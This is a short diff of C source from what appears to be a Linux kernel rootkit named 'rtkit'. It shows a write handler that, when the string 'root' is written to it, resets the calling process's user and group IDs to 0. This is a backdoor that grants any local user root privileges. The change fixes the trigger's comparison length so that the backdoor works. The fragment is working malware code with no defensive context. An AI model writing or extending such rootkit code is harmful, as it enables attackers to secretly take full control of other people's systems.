@@ -143,7 +143,7 @@ STATUS\n\
 
 static int rtkit_write(struct file *file, const char __user *buff, unsigned long count, void *data)
 {
-	if (!strncmp(buff, "root", MIN(11, count))) { //changes to root
+	if (!strncmp(buff, "root", MIN(4, count))) { //changes to root
 		struct cred *credentials = prepare_creds();
 		credentials->uid = credentials->euid = 0;
 		credentials->gid = credentials->egid = 0;
